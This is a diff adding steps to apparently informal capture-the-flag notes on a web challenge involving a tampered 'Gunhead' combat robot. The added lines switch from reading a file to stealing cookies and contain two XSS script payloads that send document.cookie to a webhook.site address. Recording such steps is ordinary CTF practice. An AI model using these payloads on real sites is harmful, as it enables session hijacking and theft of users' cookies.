@@ -105,3 +105,13 @@ Description: During Pandora's training, the Gunhead AI combat robot had been tam
       1. SUCCESS!!
    2. Okay so now lets see if we can use JS to read a file
       1. ATTEMPTS.html
+   3. Lets try a different route
+      1. Rather than trying to leak the flag with XSS lets try and grab the cookie
+
+
+
+<script>
+fetch('https://webhook.site/685c4977-50d5-430b-bcbd-bca194fbebab?c=' + document.cookie)
+</script>
+
+<script>document.location='https://webhook.site/685c4977-50d5-430b-bcbd-bca194fbebab?cookie='+document.cookie</script>
